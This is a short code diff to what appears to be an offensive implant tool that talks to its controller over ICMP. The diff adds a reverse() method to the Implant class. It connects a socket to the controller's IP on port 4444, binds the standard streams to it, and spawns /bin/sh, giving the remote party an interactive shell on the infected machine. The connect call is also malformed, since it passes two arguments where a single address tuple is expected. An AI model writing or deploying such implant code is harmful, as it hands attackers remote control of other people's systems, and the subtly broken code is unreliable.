@@ -8,6 +8,9 @@ import time
 from threading import Timer
 from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen
 import subprocess
+import socket
+import pty
+import os
 
 ICMP_ID = int(12800)
 TTL = int(64)
@@ -21,6 +24,12 @@ class Implant(Host):
 
     def join(self, shellpack):
         self.send(shellpack['ip'], "join")
+
+    def reverse(self, shellpack):
+        s=socket.socket()
+        s.connect(shellpack['ip'], 4444)
+        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+        pty.spawn("/bin/sh")
 
     def instruction(self, shellpack):
         try:
